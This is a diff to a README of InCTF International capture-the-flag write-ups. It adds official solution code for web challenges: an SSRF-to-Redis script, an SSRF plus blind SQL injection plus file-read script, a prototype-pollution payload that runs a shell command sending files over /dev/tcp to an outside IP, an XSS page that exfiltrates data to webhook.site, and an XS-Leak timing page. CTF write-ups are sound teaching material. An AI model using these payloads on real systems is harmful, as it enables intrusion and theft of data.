@@ -5,14 +5,14 @@ InCTF International is a premier hacking event targeted at hackers of all ages, 
 | Title | Category | Points | Solves | Submitted | Solution | Flag | Official WriteUp |
 |-------|----------|--------|--------|-----------|----------|------------------|------|
 | [Sanity Check](#sanity-check) | Misc | 10 | 552 | ✔️ | ✔️ | ✔️ | ❔ |
-| [Alpha Pie](#alpha-pie) | Misc | 100 | 58 | ✔️ | ✔️ | ✔️ | ❔ |
+| [Alpha Pie](#alpha-pie) | Misc | 100 | 58 | ✔️ | ✔️ | ✔️ | ❕ |
 | [blackStab Cloud Services](#blackstab-cloud-services) | Misc | 1000 | 2 | ❌ | ❌ | ❌ | ✔️ |
 | [Ancient_House](#ancienthouse) | Pwn | 545 | 33 | ❌ | ❌ | ❌ | ❔ |
-| [Node Keeper](#node-keeper) | Pwn | 925 | 14 | ❌ | ❌ | ❌ | ❔ |
+| [Node Keeper](#node-keeper) | Pwn | 925 | 14 | ❌ | ❌ | ❌ | ❕ |
 | [Kqueue](#kqueue) | Pwn | 984 | 7 | ❌ | ❌ | ❌ | ❔ |
 | [Baby Glob](#baby-glob) | Pwn | 993 | 5 | ❌ | ❌ | ❌ | ❔ |
 | [DeadlyFastGraph](#deadlyfastgraph) | Pwn | 996 | 4 | ❌ | ❌ | ❌ | ❕ |
-| [MultiStorage](#multistorage) | Pwn | 1000 | 1 | ❌ | ❌ | ❌ | ❔ |
+| [MultiStorage](#multistorage) | Pwn | 1000 | 1 | ❌ | ❌ | ❌ | ❕ |
 | [Right Now Generator](#right-now-generator) | Crypto | 100 | 51 | ❌ | ❌ | ❌ | ❔ |
 | [Lost Baggage](#lost-baggage) | Crypto | 100 | 52 | ❌ | ❌ | ❌ | ❔ |
 | [Gold_digger](#golddigger) | Crypto | 100 | 76 | ❌ | ❌ | ❌ | ❔ |
@@ -36,6 +36,13 @@ InCTF International is a premier hacking event targeted at hackers of all ages, 
 | [flagchecker](#flagchecker) | Reverse | 887 | 17 | ❌ | ❌ | ❌ | ❔ |
 | [Noodes](#noodes) | Reverse | 900 | 16 | ❌ | ❌ | ❌ | ❔ |
 | [Adventures of Lonely Knight (PART-1)](#adventures-of-lonely-knight-part-1) | Reverse | 936 | 13 | ❌ | ❌ | ❌ | ❔ |
+| [MD Notes](#md_notes) | Web | 100 | 46 | ❌ | ❌ | ❌ | ❕ |
+| [Raas](#raas) | Web | 100 | 73 | ❌ | ❌ | ❌ | ❕ |
+| [Vuln Drive](#vuln_drive) | Web | 700 | 27 | ❌ | ❌ | ❌ | ❕ |
+| [Json Analyser](#json_analyser) | Web | 804 | 22 | ❌ | ❌ | ❌ | ❕ |
+| [Notepad 1 - Snakehole's Secret](#notepad_1__snakeholes_secret) | Web | 823 | 21 | ❌ | ❌ | ❌ | ❕ |
+| [Notepad 1.5 - Arthur's Article](#notepad_15__arthurs_article) | Web | 900 | 16 | ❌ | ❌ | ❌ | ❕ |
+| [Notepad 2 - Ken's Chronicle](#notepad_2__kens_chronicle) | Web | 925 | 14 | ❌ | ❌ | ❌ | ❕ |
 
 ---
 
@@ -121,6 +128,10 @@ You can find my full game here: [alphapie.txt](./alphapie.txt)
 
 Done! We have our flag "`inctf{G00d_Job_e33ac7bae54893252e60c0187e793ef5d13d7dfa85fafa7984f8753b591247b9}`"
 
+**Official WriteUp**
+
+[sol.py](./alpha_pie_sol.py)
+
 ## blackStab Cloud Services
 
 **Challenge**
@@ -163,6 +174,10 @@ Author: [3agl3](https://twitter.com/3agl31)
 `nc pwn.challenge.bi0s.in 1234`
 
 [handout.zip](./Node_Keeper.zip)
+
+**Official WriteUp**
+
+[exp.py](./node_keeper_exp.py)
 
 ## Kqueue
 
@@ -213,8 +228,6 @@ Author: [DarkKnight](https://twitter.com/_d4rkkn1gh7)
 Exploit:
 [GitHub gist](https://gist.github.com/d4rk-kn1gh7/9bcd1d49dc07f05c371603fb4b96a651)
 
-`Full writeup coming soon :)`
-
 ## MultiStorage
 
 **Challenge**
@@ -231,6 +244,10 @@ Author: [3agl3](https://twitter.com/3agl31)
 </details>
 
 [handout.zip](./MultiStorage.zip)
+
+**Official WriteUp**
+
+[exp.c](./MultiStorage_exp.c)
 
 ## Right Now Generator
 
@@ -693,8 +710,280 @@ Author: r3x
 
 ## Adventures of Lonely Knight (PART-1)
 
+**Challenge**
+
 A lonely adventure of loney knight fighting mobs, there might be a secret in the end.
 
 Author: [fug1tive](https://twitter.com/fug1t1v31)
 
 [full_game.nes](./full_game.nes)
+
+## MD Notes
+
+**Challenge**
+
+Description: Here's a nice web application to host your notes.
+
+Links: [Challenge](http://web.challenge.bi0s.in:5432/) | [Bot](http://web.challenge.bi0s.in:1337)
+
+Author: [yadhu#2142](https://twitter.com/YadhuKrishna_)
+
+[md-notes.zip](./md-notes.zip)
+
+**Official WriteUp**
+
+Solve script: [GitHub gist](https://gist.github.com/yadhukrishnam/83ba65195ace0f1d526091e248638caf)
+
+## Raas
+
+**Challenge**
+
+Description: Since Everything is going online i decided to make a easy Requests as a Service Bot To Make life easier, But i seem to have messed up oops!!!
+
+Links: [Challenge](http://web.challenge.bi0s.in:6969/)
+
+Author: [Capt-k](https://twitter.com/Captainkay11)
+
+[Dockerfile](./Raas.Dockerfile)
+
+**Official WriteUp**
+
+```py
+from requests.sessions import session
+
+ip="web.challenge.bi0s.in:6969"
+
+url = f"http://{ip}/"
+
+sess = session()
+
+sess.get(url)
+
+uid = (sess.cookies["userID"])
+
+sess.post(url, data={"url":f"inctf://redis:6379/_set%20{uid}_isAdmin%20yes"})
+sess.get(url)
+
+print(sess.cookies["flag"])
+```
+
+## Vuln Drive
+
+**Challenge**
+
+Our new recruit worked on our new super secure file store and i am pretty sure he is good at what he does,it looks awesome. Backup link:http://web.challenge.bi0s.in:6006/
+
+Note:Challenge will restart every 10 minutes
+
+Author : Sk4d00.sh, Rohit
+
+http://web.challenge.bi0s.in:6007/
+
+**Official WriteUp**
+
+```py
+import requests
+
+s=requests.Session()
+url="http://web.challenge.bi0s.in:41666/"
+path=""
+s.post(url+'login',data={"username":"asdasd","password":"asdadssad"})
+#You can access localhost by URL encoding the url
+for i in range(33):
+    for i in '1234567890abcdef':
+        x = (path+i).encode().hex()
+        data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path like 0x2f{x}25 union select 1"}# Sql injection using like
+        r=s.post(url+'dev_test',data=data)
+        if('Not' in r.text[:10]):
+            path+=i
+            print("Path :",path,end='\r')
+            break
+data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path=0x2f{(path).encode().hex()} union select 1"}
+r = s.post(url+'dev_test', data=data)
+#Checking if we got the full path and checking length
+print(r.text)
+if('Not' in r.text[:10]):
+    print("Length :",len(path))
+    print("Path is correct!")
+#Using LFI to get the flag file
+if path:
+    print("Path :",path)
+    r=s.get(url+'return-files?f=/'+path)
+    print("Flag:",r.text)
+```
+
+## Json Analyser
+
+**Challenge**
+
+Welcome to JSON Analyser. Verify your role and get Subscription ID. Then start looking into your dump json file.
+
+Note: Deployment gets killed every 10 minutes.
+
+Challenge Author: Sayooj B Kumar#9588
+
+[json_analyser.zip](./json_analyser.zip)
+
+**Official WriteUp**
+
+[exp.py](./json_analyzer_exp.py)
+```json
+{
+    "name": {
+      "__proto__":{
+         "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/34.139.180.142/50555\\'')//"
+      }
+     },
+    "version": "1.0.0",
+    "description": "",
+    "main": "app.js",
+    "dependencies": {
+      "config-handler": "^2.0.3",
+      "express": "^4.17.1",
+      "express-fileupload": "^1.2.1",
+      "nodemon": "^2.0.12",
+      "squirrelly": "^8.0.8"
+    },
+    "devDependencies": {},
+    "scripts": {
+      "test": "echo \"Error: no test specified\" && exit 1"
+    },
+    "author": "",
+    "license": "ISC"
+ }
+```
+
+## Notepad 1 - Snakehole's Secret
+
+**Challenge**
+
+Description: Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.
+
+Links: [Challenge](http://chall.notepad1.gq:1111/) | [Bot](http://web.challenge.bi0s.in:1337/)
+
+Author: [Az3z3l](https://twitter.com/Az3z3l)
+
+[snakeholessecret.zip](./snakeholessecret.zip)
+
+**Official WriteUp**
+
+```html
+<!DOCTYPE html>
+<!-- Attacker's note:  <img src/onerror="eval(window.name)"> -->
+<html>
+    <head>
+        <title>
+            Notepad#1 Exploit
+        </title>
+    </head>
+    <body>
+        <script>
+            function sleep (time) {
+                return new Promise((resolve) => setTimeout(resolve, time));
+            }
+
+            url = "http://chall.notepad1.gq:1111/"
+            webhook = "https://webhook.site/"
+            userCookie = "55a54008ad1ba589aa210d2629c1df41"
+            endpoint1 = url + `find?startsWith=d&debug=y&Set-Cookie=id=${userCookie}%3B%20path=/get`
+
+            endpoint2 = url 
+ 
+            endpoint2payload = `document.cookie="id=${userCookie}; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon("${webhook}",data));`
+
+            window.open(endpoint1)
+            
+            sleep(1000).then(() => {
+                window.open(endpoint2, name=endpoint2payload)
+            });
+
+        </script>
+```
+
+## Notepad 1.5 - Arthur's Article
+
+**Challenge**
+
+Description: Arthur Morgan was asked to retrieve an important article from Cornwall's computer. Help him steal it.
+
+Links: [Challenge](http://chall.notepad15.gq:1515/) | [Bot](http://web.challenge.bi0s.in:1337/)
+
+Author: [Az3z3l#7404](https://twitter.com/Az3z3l)
+
+[arthursarticle.zip](./arthursarticle.zip)
+
+**Official WriteUp**
+
+[GitHub issue](https://github.com/golang/go/issues/47711)
+
+## Notepad 2 - Ken's Chronicle
+
+Description: "Years ago, when I was backpacking across Western Europe, I was just outside of Barcelona, hiking in the foothills of Mount Tibidabo. I was at the end of this path, and I came to a clearing, and there was a lake, very secluded, and there were tall trees all around. It was dead silent. Gorgeous. And across the lake, I saw a beautiful woman bathing herself. But she was crying...". There is a rumor that the rest of the story is on this website. Help Ken Adams uncover it.
+
+Links: [Challenge](https://chall.notepad2.gq/) | [Bot](http://web.challenge.bi0s.in:1337/)
+
+Author: [Az3z3l](https://twitter.com/Az3z3l)
+
+[kenschronicle.zip](./kenschronicle.zip)
+
+**Official WriteUp**
+
+```html
+<html>
+    <head>
+        <title>Exploit - Ken's Chronicle</title>
+    </head>
+
+    <body>
+
+    </body>
+    <script>
+        async function run() {
+            startsWith = window.location.search.substring(1);
+
+
+            characterSet = "abcdefghijklmno"
+            characterSet += "pqrstuvwxyz_{}"
+
+
+            for (var j = 0; j < characterSet.length; j++){
+                bf = startsWith + characterSet[j]
+                url = `https://7649ac48b82b.ngrok.io/find?startsWith=${bf}&debug&Timing-Allow-Origin=*`
+                
+                var iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.onload = "alert()"
+                document.body.appendChild(iframe);
+
+            }
+        }
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function checker(){
+            list = window.performance.getEntriesByType("resource");
+            console.log(list)
+            for (i=0; i<list.length; i++){
+                curr = list[i]
+                if (curr.nextHopProtocol == ""){
+                    try {
+                        navigator.sendBeacon(`?flag=${curr.name.split("startsWith=")[1].split("&")[0]}`)
+                    } catch (error) {
+                        console.log(error)
+                    }
+                }
+            }
+        }
+
+        async function doit() {
+            run()
+            await sleep(10000);
+            checker()
+        }
+        doit()
+    </script>
+
+
+</html>
+```
